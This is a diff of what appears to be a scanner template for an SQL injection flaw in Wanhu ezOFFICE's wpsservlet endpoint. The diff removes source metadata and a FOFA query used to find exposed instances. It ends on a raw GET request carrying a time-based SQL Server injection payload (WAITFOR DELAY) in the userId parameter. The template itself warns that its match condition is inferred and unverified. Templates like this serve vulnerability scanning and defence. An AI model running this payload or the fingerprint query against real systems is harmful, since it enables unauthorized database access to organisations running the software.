@@ -3,14 +3,8 @@ info:
   name: 万户 ezOFFICE wpsservlet存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ifxe2vxfmrsouhm7
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ifxe2vxfmrsouhm7
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'GET /defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:5%27--&orgIdString=1&domainId=1 HTTP/1.1
